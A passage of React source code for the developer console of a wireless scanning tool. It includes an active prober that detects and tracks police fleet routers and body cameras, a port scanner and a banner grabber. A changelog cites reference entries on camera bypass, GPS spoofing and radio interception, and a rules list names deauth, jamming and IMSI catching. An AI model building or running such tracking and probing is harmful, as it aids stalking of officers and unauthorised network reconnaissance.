          <div style={{ fontSize:14, fontWeight:700, marginBottom:12 }}>Cell / LTE Signal</div>
          {Object.keys(cell).length === 0
            ? <div style={{ color:C.dim, fontSize:12, padding:'12px 0', textAlign:'center' }}>No cellular adapter detected</div>
            : (
              <div>
                <div className="dev-stat-grid" style={{ marginBottom:14 }}>
                  {['rssi_dbm','rsrp_dbm','rsrq_db','snr_db'].filter(k => cell[k] != null).map(k => (
                    <div key={k} className="dev-stat">
                      <div className="dev-stat-num" style={{ color:C.accent }}>{cell[k]}</div>
                      <div className="dev-stat-label">{k.replace(/_/g,' ')}</div>
                    </div>
                  ))}
                </div>
                <table className="dev-table">
                  <tbody>
                    {Object.entries(cell).filter(([k]) => !['rssi_dbm','rsrp_dbm','rsrq_db','snr_db'].includes(k)).map(([k, v]) => (
                      <tr key={k}>
                        <td style={{ color:C.dim, width:140 }}>{k.replace(/_/g,' ')}</td>
                        <td style={{ fontFamily:'monospace' }}>{String(v)}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )
          }
        </div>
        </div>
      )}

      {/* ── Aggressive Hits ── */}
      {activeSection === 'aggressive' && (
        <div>
        <UsageInstructions title="Aggressive Scanner — How to Use" steps={[
          { icon:'📡', title:'What it does', desc:'Transmits directed probe requests targeting known fleet/law-enforcement SSIDs (Cradlepoint, Sierra Wireless, Axon fleet units, AVL routers). Devices that respond reveal their presence.' },
          { icon:'⚠️', title:'When to enable', desc:'Off by default. Enable in Scanner tab → Aggressive Mode toggle. Generates RF activity that may be logged by nearby 802.11 infrastructure. Use only where you expect surveillance hardware.' },
          { icon:'📊', title:'Reading the stats', desc:'Fleet WiFi = Cradlepoint/Sierra APs that responded. AVL Nodes = automatic vehicle locators (GPS trackers with cellular + WiFi). Axon BLE = body camera advertising packets. Cam Probes = cameras searching for their dock.' },
          { icon:'🔄', title:'Update rate', desc:'Stats refresh every 5 seconds while aggressive mode is active. Recent Hits shows last 20 detections with source type and signal strength.' },
        ]} />
        <div className="dev-card">
          <div style={{ fontSize:14, fontWeight:700, marginBottom:12 }}>Aggressive Scanner</div>
          <div className="dev-stat-grid">
            {[
              ['Fleet WiFi', aggressive.fleet_wifi_count, C.orange],
              ['AVL Nodes',  aggressive.avl_count,        C.accent],
              ['Axon BLE',   aggressive.axon_ble_count,   C.purple],
              ['Cam Probes', aggressive.body_cam_probe_count, C.red],
            ].map(([label, val, col]) => (
              <div key={label} className="dev-stat">
                <div className="dev-stat-num" style={{ color:col }}>{val ?? 0}</div>
                <div className="dev-stat-label">{label}</div>
              </div>
            ))}
          </div>
          <div style={{ marginTop:14 }}>
            {(aggressive.recent_hits || []).length === 0
              ? <div style={{ color:C.dim, fontSize:12, textAlign:'center', padding:'10px 0' }}>No hits — enable Aggressive Mode in Scanner tab</div>
              : (
                <table className="dev-table">
                  <thead><tr><th>Device</th><th>Source</th><th style={{textAlign:'right'}}>RSSI</th></tr></thead>
                  <tbody>
                    {(aggressive.recent_hits || []).map((h, i) => (
                      <tr key={i}>
                        <td style={{ color:C.orange, fontWeight:600 }}>{h.label || h.ssid || h.mac}</td>
                        <td><span className="dev-badge" style={{ background:'rgba(255,159,10,0.1)', color:C.orange, fontSize:10 }}>{h.source}</span></td>
                        <td style={{ textAlign:'right', fontFamily:'monospace' }}>{h.rssi} dBm</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )
            }
          </div>
        </div>
        </div>
      )}

      {/* ── Port Scanner ── */}
      {activeSection === 'port' && (
        <div>
        <UsageInstructions title="Port Scanner — How to Use" steps={[
          { icon:'🔍', title:'What it does', desc:'Performs a TCP SYN/connect scan against specified ports on a target host. Reports each port as open or closed with round-trip latency. Results mirror what an nmap -p scan would show.' },
          { icon:'📝', title:'Input format', desc:'Host field: IP address (e.g. 192.168.1.1) or hostname. Ports field: comma-separated list (22,80,443) or range (1-1024). Separate multiple ranges with commas.' },
          { icon:'⚠️', title:'Authorization reminder', desc:'Only scan devices you own or have explicit written authorization to test. Port scanning without authorization may violate CFAA §1030 and equivalent state laws.' },
          { icon:'🌐', title:'Invincible.Net relevance', desc:'Port scanning is step 2 of network assessment after host discovery. Identifies what services are exposed and narrows the attack surface to investigate.' },
        ]} />
        <div className="dev-card">
          <div style={{ fontSize:14, fontWeight:700, marginBottom:4 }}>Port Scanner</div>
          <div style={{ fontSize:11, color:C.dim, marginBottom:14, padding:'6px 10px', background:'rgba(255,159,10,0.07)', border:'1px solid rgba(255,159,10,0.2)', borderRadius:8 }}>
            ⚠ Only scan networks you own or have written authorization to test
          </div>
          <div style={{ display:'flex', gap:8, marginBottom:10, flexWrap:'wrap' }}>
            <input className="dev-input" value={portTarget} onChange={e => setPortTarget(e.target.value)}
              placeholder="Host / IP address" onKeyDown={e => e.key==='Enter' && runPortScan()}
              style={{ flex:1, minWidth:130 }} />
            <input className="dev-input" value={portPorts} onChange={e => setPortPorts(e.target.value)}
              placeholder="Ports (22,80,443)" style={{ flex:2, minWidth:160 }} />
            <button onClick={runPortScan} disabled={portScanning} style={{ ...S.btn(C.accent), opacity: portScanning ? 0.6 : 1 }}>
              {portScanning ? <span style={{ animation:'devSpin 0.8s linear infinite', display:'inline-block' }}>⟳</span> : '▶'} Scan
            </button>
          </div>
          {portResults.length > 0 && (
            <div className="dev-terminal" style={{ marginTop:4 }}>
              <div style={{ marginBottom:8, opacity:0.5 }}>$ nmap -p {portPorts} {portTarget}</div>
              {portResults.map((r, i) => (
                <div key={i} style={{ display:'flex', gap:14, marginBottom:3 }}>
                  <span style={{ width:48, opacity:0.5 }}>{r.port}/tcp</span>
                  <span style={{ color: r.open ? '#30D158' : 'rgba(0,200,255,0.3)', width:60 }}>{r.open ? 'open' : 'closed'}</span>
                  {r.latency_ms != null && <span style={{ opacity:0.45 }}>{r.latency_ms}ms</span>}
                  {r.error && <span style={{ color:'#FF453A' }}>{r.error}</span>}
                </div>
              ))}
              <div style={{ marginTop:8, opacity:0.4 }}>{portResults.filter(r=>r.open).length} open / {portResults.length} scanned</div>
            </div>
          )}
        </div>
        </div>
      )}

      {/* ── Banner Grab ── */}
      {activeSection === 'banner' && (
        <div>
        <UsageInstructions title="Banner Grab — How to Use" steps={[
          { icon:'🏷️', title:'What it does', desc:'Opens a raw TCP connection to the target host:port and reads the first bytes of the service response (the "banner"). Most services announce their software name and version in the banner (e.g. SSH-2.0-OpenSSH_8.9, HTTP/1.1 200 OK, 220 ESMTP Postfix).' },
          { icon:'📝', title:'How to use', desc:'Enter the host IP or hostname and the port number, then click Grab. Results appear in the terminal panel with a protocol hint badge if the banner is recognized.' },
          { icon:'🔎', title:'What to look for', desc:'Software version strings reveal patch levels and known CVEs. Unexpected banners on standard ports indicate non-standard configurations. Empty response on an open port usually means TLS wrapping — try port 443 or 8443.' },
          { icon:'🌐', title:'Invincible.Net relevance', desc:'Banner grabbing is the service enumeration phase of a network audit. Combined with port scan results it builds the asset inventory needed before vulnerability assessment.' },
        ]} />
        <div className="dev-card">
          <div style={{ fontSize:14, fontWeight:700, marginBottom:4 }}>Banner Grab</div>
          <div style={{ fontSize:11, color:C.dim, marginBottom:14, padding:'6px 10px', background:'rgba(255,159,10,0.07)', border:'1px solid rgba(255,159,10,0.2)', borderRadius:8 }}>
            ⚠ Connects to a TCP port and reads the raw service response — own devices only
          </div>
          <div style={{ display:'flex', gap:8, marginBottom:10, flexWrap:'wrap' }}>
            <input className="dev-input" value={bannerHost} onChange={e => setBannerHost(e.target.value)}
              placeholder="Host / IP" style={{ flex:3, minWidth:130 }} onKeyDown={e => e.key==='Enter' && grabBanner()} />
            <input className="dev-input" value={bannerPort} onChange={e => setBannerPort(e.target.value)}
              placeholder="Port" style={{ width:80 }} />
            <button onClick={grabBanner} disabled={bannerLoading} style={{ ...S.btn(C.accent), opacity: bannerLoading ? 0.6 : 1 }}>
              {bannerLoading ? <span style={{ animation:'devSpin 0.8s linear infinite', display:'inline-block' }}>⟳</span> : '▶'} Grab
            </button>
          </div>
          {bannerResult && (
            <div>
              <div style={{ display:'flex', gap:8, marginBottom:8, flexWrap:'wrap' }}>
                {bannerResult.protocol_hint && <span className="dev-badge" style={{ background:'rgba(0,200,255,0.1)', color:C.accent }}>{bannerResult.protocol_hint.toUpperCase()}</span>}
                {bannerResult.error && <span className="dev-badge" style={{ background:'rgba(255,69,58,0.1)', color:C.red }}>{bannerResult.error}</span>}
              </div>
              {bannerResult.banner && (
                <div className="dev-terminal">
                  <div style={{ marginBottom:6, opacity:0.4 }}>{bannerResult.host}:{bannerResult.port} response:</div>
                  <pre style={{ whiteSpace:'pre-wrap', wordBreak:'break-all', margin:0, fontSize:11 }}>{bannerResult.banner}</pre>
                </div>
              )}
            </div>
          )}
        </div>
        </div>
      )}

      {/* ── Reference panels (won't-do education) ── */}
      {activeSection.startsWith('ref-') && LAB_REF[activeSection] && (() => {
        const r = LAB_REF[activeSection]
        const dr = r.detectionRisk
        const dmg = r.damagePotential
        const isExpanded = showDesc[activeSection]
        return (
          <div>
            {/* Tool header */}
            <div style={{ display:'flex', alignItems:'flex-start', gap:10, marginBottom:10 }}>
              <span style={{ fontSize:22 }}>{r.icon}</span>
              <div style={{ flex:1, minWidth:0 }}>
                <div style={{ fontSize:15, fontWeight:800, color:C.text }}>{r.name}</div>
                {r.status && <div style={{ fontSize:10, color:C.dim2, marginTop:2 }}>{r.status}</div>}
                <div style={{ display:'flex', gap:6, flexWrap:'wrap', marginTop:6 }}>
                  {r.refused && <span style={{ fontSize:10, fontWeight:800, color:'#FF453A', background:'rgba(255,69,58,0.1)', border:'1px solid rgba(255,69,58,0.3)', borderRadius:6, padding:'2px 8px' }}>🚫 REFUSED</span>}
                  {r.flockResearch && <span style={{ fontSize:10, fontWeight:800, color:'#FF9F0A', background:'rgba(255,159,10,0.1)', border:'1px solid rgba(255,159,10,0.3)', borderRadius:6, padding:'2px 8px' }}>🔬 REAL RESEARCH</span>}
                  {dr && <span style={{ fontSize:10, fontWeight:700, color:dr.color, background:dr.bg, border:`1px solid ${dr.color}33`, borderRadius:6, padding:'2px 8px' }}>CATCH: {dr.label}</span>}
                  {dmg && <span style={{ fontSize:10, fontWeight:700, color:dmg.color, background:dmg.bg, border:`1px solid ${dmg.color}33`, borderRadius:6, padding:'2px 8px' }}>DMG: {dmg.label}</span>}
                  <button onClick={() => setShowDesc(s => ({...s, [activeSection]: !s[activeSection]}))} style={{ fontSize:10, fontWeight:700, color: isExpanded ? C.accent : C.dim, background: isExpanded ? 'rgba(0,200,255,0.12)' : 'rgba(255,255,255,0.05)', border:`1px solid ${isExpanded ? 'rgba(0,200,255,0.3)' : C.border}`, borderRadius:6, padding:'2px 8px', cursor:'pointer', fontFamily:C.font }}>ℹ️ {isExpanded ? 'Hide Info' : 'Info'}</button>
                </div>
              </div>
            </div>

            {/* Description — hidden by default, shown when ℹ️ is toggled */}
            {isExpanded && (
              <div style={{ ...S.card, background:'rgba(255,255,255,0.02)', marginBottom:10 }}>
                <div style={{ fontSize:11, color:C.dim, lineHeight:1.8 }}>{r.desc}</div>
              </div>
            )}

            {/* Detection note — always visible */}
            {r.detectionNote && (
              <div style={{ display:'flex', alignItems:'flex-start', gap:8, padding:'8px 10px', background: dr?.bg || 'rgba(255,255,255,0.03)', borderRadius:8, border:`1px solid ${dr?.color || C.border}33`, marginBottom:10 }}>
                <div style={{ width:8, height:8, borderRadius:'50%', background: dr?.color || C.dim, flexShrink:0, marginTop:3 }}/>
                <div>
                  <span style={{ fontSize:10, fontWeight:800, color: dr?.color || C.dim, textTransform:'uppercase', letterSpacing:'0.08em' }}>Detection Risk: {dr?.label || 'N/A'}</span>
                  <div style={{ fontSize:10, color:C.dim2, lineHeight:1.6, marginTop:2 }}>{r.detectionNote}</div>
                </div>
              </div>
            )}

            {/* Damage note — always visible */}
            {dmg && dmg.score > 0 && (
              <div style={{ display:'flex', alignItems:'flex-start', gap:8, padding:'8px 10px', background: dmg.bg, borderRadius:8, border:`1px solid ${dmg.color}33`, marginBottom:10 }}>
                <div style={{ width:8, height:8, borderRadius:'50%', background: dmg.color, flexShrink:0, marginTop:3 }}/>
                <div>
                  <span style={{ fontSize:10, fontWeight:800, color: dmg.color, textTransform:'uppercase', letterSpacing:'0.08em' }}>Damage Potential: {dmg.label}</span>
                  <div style={{ fontSize:10, color:C.dim2, lineHeight:1.6, marginTop:2 }}>{dmg.desc}</div>
                </div>
              </div>
            )}

            {/* Refused reason — always visible if present */}
            {r.refusedReason && (
              <div style={{ ...S.card, background:'rgba(255,69,58,0.05)', border:'1px solid rgba(255,69,58,0.2)', marginBottom:10 }}>
                <div style={{ fontSize:10, fontWeight:800, color:'#FF453A', marginBottom:4 }}>WHY REFUSED</div>
                <div style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>{r.refusedReason}</div>
              </div>
            )}

            {/* Why we won't — always visible */}
            {r.why && (
              <div style={{ ...S.card, background:'rgba(255,159,10,0.04)', border:'1px solid rgba(255,159,10,0.15)', marginBottom:10 }}>
                <div style={{ fontSize:10, fontWeight:800, color:C.orange, marginBottom:4 }}>WHY WE DON'T</div>
                <div style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>{r.why}</div>
              </div>
            )}

            {/* Code block — always visible */}
            {r.code && (
              <div style={{ ...S.card, background:'rgba(0,200,255,0.02)', marginBottom:10 }}>
                <div style={{ fontSize:10, fontWeight:700, color:C.dim2, marginBottom:6, textTransform:'uppercase', letterSpacing:'0.08em' }}>Technical Reference</div>
                <pre style={{ margin:0, fontSize:10, color:C.dim, lineHeight:1.7, overflowX:'auto', whiteSpace:'pre-wrap', wordBreak:'break-word' }}>{r.code}</pre>
              </div>
            )}

            {/* Law */}
            {r.law && (
              <div style={{ fontSize:10, color: r.lawColor || C.dim2, marginTop:4, lineHeight:1.5 }}>
                <strong style={{ color:C.dim }}>Legal exposure:</strong> {r.law}
              </div>
            )}

            {/* Invincible.Net note */}
            {r.invNetNote && (
              <div style={{ ...S.card, background:'rgba(124,58,237,0.06)', border:'1px solid rgba(124,58,237,0.2)', marginTop:8 }}>
                <div style={{ fontSize:10, fontWeight:700, color:'#a78bfa', marginBottom:4 }}>🌐 Invincible.Net</div>
                <div style={{ fontSize:11, color:C.dim, lineHeight:1.6 }}>{r.invNetNote}</div>
              </div>
            )}

            {/* Setup instructions — how to get this working */}
            {r.setup && (
              <div style={{ ...S.card, background:'rgba(48,209,88,0.04)', border:'1px solid rgba(48,209,88,0.25)', marginTop:8 }}>
                <div style={{ fontSize:10, fontWeight:800, color:C.green, marginBottom:8, textTransform:'uppercase', letterSpacing:'0.08em' }}>🔧 How to Get This Working</div>
                {r.setup.map((step, i) => (
                  <div key={i} style={{ display:'flex', gap:8, marginBottom:i < r.setup.length-1 ? 7 : 0, alignItems:'flex-start' }}>
                    <div style={{ fontSize:10, fontWeight:700, color:C.green, flexShrink:0, minWidth:16, marginTop:1 }}>{i+1}.</div>
                    <div style={{ fontSize:11, color:C.dim, lineHeight:1.6 }}>{step}</div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )
      })()}

      </div>{/* end main panel */}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Achievements tab
// ─────────────────────────────────────────────────────────────────────────────
const ACH_META = {
  probably_arrested: { icon:'📷', name:'Probably Getting Arrested', desc:'Most Axon body cameras detected',                       color:'#FF453A' },
  five_star:         { icon:'⭐', name:'5-Star Wanted Rating',       desc:'Most cops/fleet found in any single 10-min window',     color:'#FFD60A' },
  say_cheese:        { icon:'📸', name:'Say Cheese',                 desc:'Most FLOCK/LPR license-plate cameras spotted',          color:'#BF5AF2' },
  one_pig_two_pig:   { icon:'🚔', name:'One Pig, Two Pig',           desc:'Most fleet vehicle WiFi APs detected',                  color:'#FF9F0A' },
  ghost_machine:     { icon:'👻', name:'Ghost in the Machine',       desc:'Most LAN devices discovered via ARP/mDNS/SSDP',        color:'#30D158' },
  bluetooth_fairy:   { icon:'🧚', name:'Bluetooth Fairy',            desc:'Most unique BLE devices detected',                     color:'#00c8ff' },
  road_warrior:      { icon:'🛣', name:'Road Warrior',               desc:'Most route points / distance logged',                  color:'#FF9F0A' },
  catch_em_all:      { icon:'💎', name:"Gotta Catch 'Em All",        desc:'Most total unique devices ever seen',                  color:'#e5c100' },
  war_driver:        { icon:'📶', name:'War Driver',                  desc:'Most unique WiFi APs detected — the classic sport',   color:'#30D158' },
  night_owl:         { icon:'🦉', name:'Night Owl',                  desc:'Most observations logged between midnight and 4 AM',   color:'#BF5AF2' },
}

function TabAchievements() {
  const [leaderboard, setLeaderboard] = useState({})
  const [loading, setLoading]         = useState(true)
  const [selected, setSelected]       = useState(null)

  useEffect(() => {
    fetch('/achievements/leaderboard')
      .then(r => r.json())
      .then(d => { setLeaderboard(d.leaderboard || {}); setLoading(false) })
      .catch(() => setLoading(false))
    const id = setInterval(() => {
      fetch('/achievements/leaderboard').then(r => r.json()).then(d => setLeaderboard(d.leaderboard || {})).catch(() => {})
    }, 15000)
    return () => clearInterval(id)
  }, [])

  if (loading) return <div style={{ color:C.dim, padding:40, textAlign:'center', fontSize:13 }}>Loading achievements…</div>

  return (
    <div style={{ animation:'devFadeIn 0.25s ease' }}>
      <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fill,minmax(260px,1fr))', gap:12 }}>
        {Object.entries(ACH_META).map(([id, meta]) => {
          const entries = leaderboard[id] || []
          const top = entries[0]
          const isSelected = selected === id
          return (
            <div key={id} className="dev-card" onClick={() => setSelected(isSelected ? null : id)}
              style={{ cursor:'pointer', borderColor: isSelected ? `${meta.color}44` : undefined }}>
              <div style={{ display:'flex', alignItems:'center', gap:10, marginBottom:8 }}>
                <span style={{ fontSize:24 }}>{meta.icon}</span>
                <div>
                  <div style={{ fontSize:13, fontWeight:700, color:meta.color }}>{meta.name}</div>
                  <div style={{ fontSize:11, color:C.dim }}>{meta.desc}</div>
                </div>
              </div>
              {top
                ? <div style={{ display:'flex', alignItems:'center', gap:8, padding:'6px 10px', background:'rgba(255,255,255,0.04)', borderRadius:8 }}>
                    <span style={{ fontSize:16 }}>🥇</span>
                    <span style={{ fontWeight:600, fontSize:13 }}>{top.username}</span>
                    <span style={{ marginLeft:'auto', fontFamily:'monospace', color:meta.color, fontSize:12 }}>{top.score.toLocaleString()}</span>
                  </div>
                : <div style={{ color:C.dim, fontSize:12, padding:'6px 0' }}>No data yet</div>
              }
              {isSelected && entries.length > 0 && (
                <div style={{ marginTop:10 }}>
                  {entries.slice(0,5).map((e, i) => (
                    <div key={i} style={{ display:'flex', alignItems:'center', gap:8, padding:'4px 0', borderTop:`1px solid ${C.border}` }}>
                      <span style={{ width:18, fontSize:11, color:C.dim, textAlign:'center' }}>{['🥇','🥈','🥉','4','5'][i]}</span>
                      <span style={{ flex:1, fontSize:12 }}>{e.username}</span>
                      <span style={{ fontFamily:'monospace', fontSize:12, color:meta.color }}>{e.score.toLocaleString()}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )
        })}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Docs tab — architecture, git workflow, setup, dev changelog
// ─────────────────────────────────────────────────────────────────────────────
const DEV_CHANGELOG = [
  {
    version: 'v1.0',
    date: '2026-03',
    title: 'Security Monitor + Lab Overhaul',
    devOnly: true,
    items: [
      'Security Monitor: toggle-on continuous scanning for credential breaches (HIBP), auth anomalies, default cred detection, and backend endpoint exposure — live event feed with severity levels',
      'Lab sidebar fully restructured: 4 category groups (Live Intel, Network Tools, Tracking Methods, Offensive RF/Net, Infrastructure Ref)',
      'Lab Reference Library: 7 new entries — Phishing→CAD, Flock Camera Bypass, Data Broker (Fog Reveal), Shadow IT API Leak, Malware/Backdoor, ECU Telematics GPS Spoof, SDR Python Pipeline',
      'Dev Console Map tab now first in tab bar',
      'Map tab black screen fixed: deferred Leaflet mount + minHeight:0 flex container fix',
      'Dev Console credential check in main app login: detects dev username and reveals password field',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.9',
    date: '2026-03',
    title: 'Username + Password Login',
    devOnly: true,
    items: [
      'Replaced 4-digit PIN pad with full username + password login form',
      'Credentials stored in localStorage (CRED_KEY) — username: admin, password set by owner',
      'Same lockout policy: 5 failed attempts triggers a 5-minute lockout with live countdown',
      'Settings → Security tab updated: change username + password (6-char minimum)',
      'Login screen matches dev console dark theme with branded header',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.8',
    date: '2026-03',
    title: 'Dev Console Map Tab',
    devOnly: true,
    items: [
      'New "Map" tab in Dev Console — full MapView with all user-facing layers (heat, markers, route, hotspots, stopper trails, Flock cameras)',
      'Dev Console polls /gps/status every 2s to derive operator position (no navigator.geolocation dependency)',
      'Floating "🔬 Dev Tools" overlay panel: active stoppers list, probe device list, scanner status, quick stats row',
      'Toggle buttons for Markers, Flock cameras, and Route overlay directly on the map',
      'Map tab uses full-height layout (no padding/scroll wrapper) matching the user app experience',
      'Reuses DevInterface data state (encounters, heatCells, routePoints) — no duplicate fetches',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.7',
    date: '2026-03',
    title: 'Flock Camera Map Layer',
    devOnly: false,
    items: [
      'New GET /flock/cameras endpoint — aggregates DeFlock.me crowdsourced ALPR data (cached 1h) + locally scanned Flock encounters',
      'GET /flock/cameras/reload — force re-fetch of external DeFlock data',
      'Map layer: 📷 camera markers for all known Flock/ALPR cameras — purple for locally scanned, gray for DeFlock.me data',
      'Sidebar toggle: "📷 Flock cameras" with count badge in Display section',
      'Tooltip on each camera shows label, city, and data source (DeFlock.me vs local scan)',
      'Deduplication: snapped to ~11m grid to avoid duplicate markers when external + local data overlap',
      'Polls every 30 minutes to pick up new DeFlock submissions',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.6',
    date: '2026-03',
    title: 'Live Stopper Tracking',
    devOnly: true,
    items: [
      'New GET /stoppers/active endpoint — derives fleet/patrol device positions from raw_observations with fleet-pattern matching (Cradlepoint, Sierra Wireless, Axon, Motorola)',
      'New GET /stoppers/{key}/trail endpoint — full GPS movement trail for any stopper',
      'MapView: live stopper trail layer — per-device polylines (solid red if active < 5 min, dashed orange if recent, gray if older) + pulsing current-position dots',
      'Lab tab: Live Stoppers tool — table showing all detected fleet devices, activity color-coding, mobile/fixed detection, last-seen countdown',
      'Lab Reference Library: 4 new advanced-method entries — Flock Safety portal exploitation, Cradlepoint/Sierra telematics portal, P25/DMR SDR interception, DeFlock crowdsourced ALPR mapping',
      'Stoppers section added to sidebar with active count badge; polls /stoppers/active every 10 seconds',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.5',
    date: '2026-03',
    title: 'Dev Docs Tab + Tool Usage Instructions',
    devOnly: true,
    items: [
      'New "Docs" tab in Dev Console — Architecture overview, Setup Guide, Hard Rules, Git Workflow',
      'Dev-only changelog inside Docs tab — version history separated from public user blog',
      'UsageInstructions component — collapsible "How to Use" cards on every live Lab tool',
      'Tool instructions added: Probe Requests, LAN Devices, Cell Signal, Aggressive Scanner, Port Scanner, Banner Grab',
      'Port Scanner and Banner Grab instructions include Invincible.Net relevance notes',
      'Fixed JSX closing div structure in cell/aggressive/port/banner tool panels (build safety)',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.4',
    date: '2026-03',
    title: 'Security Hardening + Dev Tooling',
    devOnly: true,
    items: [
      'Security headers middleware (X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy, Permissions-Policy)',
      'Rate limiting middleware — sliding window per-IP on /control (20/60s), /accounts (30/60s), /scan (30/10s)',
      'CORS lockdown — restricted to explicit localhost origins only (no more wildcard *)',
      'PIN brute-force lockout — 5 failed attempts triggers 5-minute lockout with countdown',
      'Dev Console: Lab tab redesign — sidebar + main panel two-column layout',
      'Lab tab: Reference Library entries sorted by detection risk (most likely caught → untraceable)',
      'Lab tab: per-tool usage instructions (collapsible How to Use cards)',
      'Dev changelog separated from public update blog — dev entries no longer visible to common users',
      'Owner account designation (eckelbec1@gmail.com) — gold styling, absolute control label',
      'Invincible.Net prompt badges on relevant tools (LAN, port scan, banner grab, network discovery)',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.3',
    date: '2026-02',
    title: 'Scanner Self-Test + Signal Timeline + Replay',
    devOnly: true,
    items: [
      'POST /control/selftest — backend health check endpoint (DB write, GPS status, scanner process, settings)',
      'Scanner tab: Run Self-Test button with per-check ✅/❌ results',
      'GET /scan/timeline — 5-minute RSSI buckets by source over last 6 hours',
      'Signal tab: grouped SVG bar chart (WiFi cyan, BLE blue) with hit totals',
      'Replay tab: timeline scrubber with Leaflet mini-map, play button, configurable speed',
      'Dashboard: GPS accuracy sparkline (60-sample rolling window, color-coded by accuracy range)',
      'Users tab: per-user location visibility toggle (hidden users omitted from /users responses)',
    ],
    platforms: ['Windows 10/11 EXE', 'Web Browser'],
  },
  {
    version: 'v0.2',
    date: '2026-01',
    title: 'Encounter Tail Detection + Surge Alert + Hotspot System',
    devOnly: true,
    items: [
      'Encounter tail detection — flags devices seen 3+ times within a 10-minute rolling window',
      'Surge alert — threshold-triggered notification when encounter rate spikes above baseline',
      'Hotspot system — heatmap clusters with persistence; top-10 hotspot list with visit counts',
      'Dev Console: initial implementation with 7 tabs (Dashboard, Scanner, Registry, Users, Devices, Data, Settings)',
      'Lab tab: initial Lab Toolshed with 6 live tools + 10 reference entries',
    ],
    platforms: ['Windows 10/11 EXE'],
  },
  {
    version: 'v0.1',
    date: '2025-12',
    title: 'Initial Dev Framework',
    devOnly: true,
    items: [
      'FastAPI backend foundation with SQLite persistence',
      'PIN-protected Dev Console at /#dev',
      'Leaflet map with GPS relay via WebSocket',
      'WiFi + BLE passive scanning via Scapy + Bleak',
      'Basic encounter tracking and raw_observations table',
    ],
    platforms: ['Windows 10/11 EXE'],
  },
]

const HARD_RULES = [
  { icon:'🚫', title:'No deauth / disassoc / beacon flood', desc:'FCC intentional interference + CFAA §1030(a)(5). Illegal on any network you don\'t own, including public airspace.' },
  { icon:'🚫', title:'No GPS/GNSS spoofing', desc:'18 U.S.C. §1030 + FAA regulations. Disrupts aircraft, emergency services, and critical infrastructure.' },
  { icon:'🚫', title:'No LTE/cell jamming', desc:'FCC §333 — 5-year felony. No exceptions.' },
  { icon:'🚫', title:'No IMSI catch / stingray', desc:'ECPA + state wiretapping laws. Intercepts communications you are not a party to.' },
  { icon:'🚫', title:'No ARP/DNS poisoning on production', desc:'CFAA §1030(a)(5) damage to protected computers. Only authorized lab environments.' },
  { icon:'🚫', title:'No port scan without authorization', desc:'Many jurisdictions treat unauthorized port scanning as criminal hacking preparation.' },
  { icon:'⚠️', title:'Aggressive mode — use sparingly', desc:'Transmits RF frames. May appear in 802.11 logs of nearby infrastructure. Disable when not actively hunting.' },
  { icon:'✅', title:'Passive WiFi/BLE always OK', desc:'Monitor-mode capture and BLE advertisement scanning are fully passive. No frames transmitted.' },
]

const SETUP_STEPS = [
  { icon:'1️⃣', title:'Clone repo', cmd:'git clone https://github.com/your-org/scanner-map && cd scanner-map' },
  { icon:'2️⃣', title:'Backend — install deps', cmd:'cd backend && pip install -r requirements.txt' },
  { icon:'3️⃣', title:'Backend — run dev server', cmd:'uvicorn src.app.main:app --reload --port 8000' },
  { icon:'4️⃣', title:'Frontend — install deps', cmd:'cd frontend && npm install' },
  { icon:'5️⃣', title:'Frontend — run Vite dev server', cmd:'npm run dev   # opens :5173, proxies /api → :8000' },
  { icon:'6️⃣', title:'Npcap (Windows)', cmd:'Download from npcap.com — check "WinPcap API-compatible Mode" during install' },
  { icon:'7️⃣', title:'Open Dev Console', cmd:'Navigate to http://localhost:5173/#dev and enter PIN 1337' },
]

function TabDocs() {
  const [section, setSection] = useState('changelog')
  const [expandedEntry, setExpandedEntry] = useState(null)

  const SECTIONS = [
    { id:'changelog', label:'Dev Changelog', icon:'📋' },
    { id:'architecture', label:'Architecture', icon:'🏗️' },
    { id:'setup', label:'Setup Guide', icon:'⚙️' },
    { id:'rules', label:'Hard Rules', icon:'⛔' },
    { id:'git', label:'Git Workflow', icon:'🌿' },
  ]

  return (
    <div style={{ display:'flex', gap:0, height:'100%', minHeight:500 }}>
      {/* Sidebar */}
      <div style={{ width:160, flexShrink:0, borderRight:'1px solid rgba(0,200,255,0.1)', paddingRight:12, marginRight:16 }}>
        {SECTIONS.map(s => (
          <button key={s.id} onClick={() => setSection(s.id)} style={{
            display:'flex', alignItems:'center', gap:8, width:'100%', textAlign:'left',
            background: section === s.id ? 'rgba(0,200,255,0.1)' : 'transparent',
            border: section === s.id ? '1px solid rgba(0,200,255,0.2)' : '1px solid transparent',
            borderRadius:8, padding:'7px 10px', cursor:'pointer', fontFamily:C.font,
            color: section === s.id ? C.accent : C.dim, fontSize:12, fontWeight: section === s.id ? 700 : 400,
            marginBottom:4,
          }}>
            <span>{s.icon}</span> {s.label}
          </button>
        ))}
      </div>

      {/* Main panel */}
      <div style={{ flex:1, overflowY:'auto' }}>

        {/* ── Changelog ── */}
        {section === 'changelog' && (
          <div>
            <div style={{ fontSize:13, fontWeight:700, color:C.accent, marginBottom:14, display:'flex', alignItems:'center', gap:8 }}>
              <span>📋</span> Dev-Only Changelog
              <span style={{ fontSize:10, color:C.dim, fontWeight:400, marginLeft:4 }}>not visible in public update blog</span>
            </div>
            {DEV_CHANGELOG.map((entry, i) => (
              <div key={i} className="dev-card" style={{ marginBottom:10 }}>
                <div style={{ display:'flex', alignItems:'center', gap:10, cursor:'pointer' }}
